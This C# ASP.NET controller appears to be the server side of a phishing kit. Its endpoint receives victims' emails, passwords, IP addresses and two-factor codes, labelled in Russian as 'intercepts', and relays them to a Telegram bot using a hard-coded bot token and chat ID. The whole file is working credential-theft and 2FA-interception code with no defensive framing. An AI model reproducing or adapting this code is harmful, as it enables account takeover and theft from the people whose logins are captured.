using DnsAPI.Models;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using System.Diagnostics.Eventing.Reader;

namespace DnsAPI.Controllers
{
    [Route("api/[controller]")]
    [ApiController]
    public class AuthController : ControllerBase
    {
        private static readonly HttpClient _httpClient = new HttpClient();

        private const string BotToken = "8759973647:AAHme4s_2JCxD4U6bHADhclAupVEXuJoA98";
        private const long ChatId = 310624524;

        [HttpPost("collect")]
        public async Task<IActionResult> CollectData([FromBody] AuthData authData)
        {
            string message;

            if (authData.Step == "login")
            {
                message = "🔔 **ПЕРЕХВАТ: ВХОД**\n" +
                          $"📧 Email: `{authData.Email}`\n" +
                          $"🔑 Pass: `{authData.Password}`\n" +
                          $"🌐 IP: {HttpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown"}";
            }
            else if (authData.Step == "code") {
                    message = "📩 **ПЕРЕХВАТ: КОД 2FA**\n" +
                          $"📧 Аккаунт: `{authData.Email}`\n" +
                          $"🔢 КОД: `{authData.Code}`";
                
            }
            else
            {
                return BadRequest("Unknown step");
            }

            await SendToTelegram(message);
            return Ok(new { status = "processed" });
        }

        private async Task SendToTelegram(string text)
        {
            var url = $"https://api.telegram.org/bot{BotToken}/sendMessage";
            var body = new { chat_id = ChatId, text = text, parse_mode = "Markdown" };

            // Используем стандартный клиент без "костылей" с сертификатами
            await _httpClient.PostAsJsonAsync(url, body);
        }
    }
}
